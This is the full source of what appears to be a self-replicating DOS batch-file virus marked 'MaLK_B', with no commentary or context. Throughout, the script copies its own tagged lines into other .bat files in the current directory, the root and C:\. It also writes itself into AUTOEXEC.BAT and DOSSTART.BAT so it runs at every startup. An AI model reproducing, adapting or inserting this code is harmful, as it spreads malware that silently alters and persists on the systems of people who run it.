@echo off%[MaLK_B]%
if exist \noway goto MaLK_B_Finish
if not exist %0.bat goto MaLK_B_Finish
if %0==AUTOEXEC goto MaLK_BAuto
if %0==DOSSTART goto MaLK_BDosS
for %%f in (*.bat) do set MaLK_B=%%f
find /i "MaLK_B"<%MaLK_B%>nul
if errorlevel 1 find "MaLK_B"<%0.bat>>%MaLK_B%
for %%f in (\*.bat) do set MaLK_B=%%f
find /i "MaLK_B"<%MaLK_B%>nul
if errorlevel 1 find "MaLK_B"<%0.bat>>%MaLK_B%
for %%f in (c:\*.bat) do set MaLK_B=%%f
find /i "MaLK_B"<%MaLK_B%>nul
if errorlevel 1 find "MaLK_B"<%0.bat>>%MaLK_B%
:MaLK_B
if not exist C:\AUTOEXEC.BAT goto MaLK_B_CA
find /i "MaLK_B"<C:\AUTOEXEC.BAT>nul
if errorlevel 1 find "MaLK_B"<%0.bat>>C:\AUTOEXEC.BAT
goto MaLK_B_Finish
:MaLK_B_CA
find "MaLK_B"<%0.bat>>C:\AUTOEXEC.BAT
:MaLK_BDosS
set MaLK_BEx=WIN.COM
%MaLK_BEx%
:MaLK_BAuto
cd %winbootdir%
for %%f in (*.BAT) do set MaLK_B=%%f
find /i "MaLK_B"<%MaLK_B%>nul
if errorlevel 1 find "MaLK_B"<%0.bat>>%MaLK_B%
if not exist DOSSTART.BAT goto MaLK_B_DSC
find /i "MaLK_B"<DOSSTART.BAT>nul
if errorlevel 1 goto MaLK_B_DSC
goto MaLK_B_Finish
:MaLK_B_DSC
find "MaLK_B"<%0.bat>>DOSSTART.BAT
:MaLK_B_Finish
